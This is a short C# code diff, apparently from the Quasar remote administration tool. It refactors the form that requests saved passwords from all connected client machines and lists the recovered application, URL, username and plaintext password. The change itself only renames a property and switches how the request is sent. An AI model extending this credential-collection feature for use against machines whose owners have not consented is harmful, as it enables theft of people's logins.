@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
+using Quasar.Common.Messages;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
@@ -33,7 +34,7 @@ namespace xServer.Forms
             _noResultsFound = new RecoveredAccount()
             {
                 Application = "No Results Found",
-                URL = "N/A",
+                Url = "N/A",
                 Username = "N/A",
                 Password = "N/A"
             };
@@ -59,9 +60,9 @@ namespace xServer.Forms
         {
             clearAllToolStripMenuItem_Click(null, null);
 
-            var req = new Core.Packets.ServerPackets.GetPasswords();
+            var req = new GetPasswords();
             foreach (var client in _clients.Where(client => client != null))
-                req.Execute(client);
+                client.Send(req);
         }
 
         public void AddPasswords(RecoveredAccount[] accounts, string identification)
@@ -76,7 +77,7 @@ namespace xServer.Forms
                     {
                         var lvi = new ListViewItem { Tag = acc, Text = identification };
 
-                        lvi.SubItems.Add(acc.URL); // URL
+                        lvi.SubItems.Add(acc.Url); // URL
                         lvi.SubItems.Add(acc.Username); // User
                         lvi.SubItems.Add(acc.Password); // Pass
 
@@ -100,7 +101,7 @@ namespace xServer.Forms
                 {
                     var lvi = new ListViewItem { Tag = _noResultsFound, Text = identification };
 
-                    lvi.SubItems.Add(_noResultsFound.URL); // URL
+                    lvi.SubItems.Add(_noResultsFound.Url); // URL
                     lvi.SubItems.Add(_noResultsFound.Username); // User
                     lvi.SubItems.Add(_noResultsFound.Password); // Pass
 
@@ -132,7 +133,7 @@ namespace xServer.Forms
         {
             return format
                 .Replace("APP", login.Application)
-                .Replace("URL", login.URL)
+                .Replace("URL", login.Url)
                 .Replace("USER", login.Username)
                 .Replace("PASS", login.Password);
         }
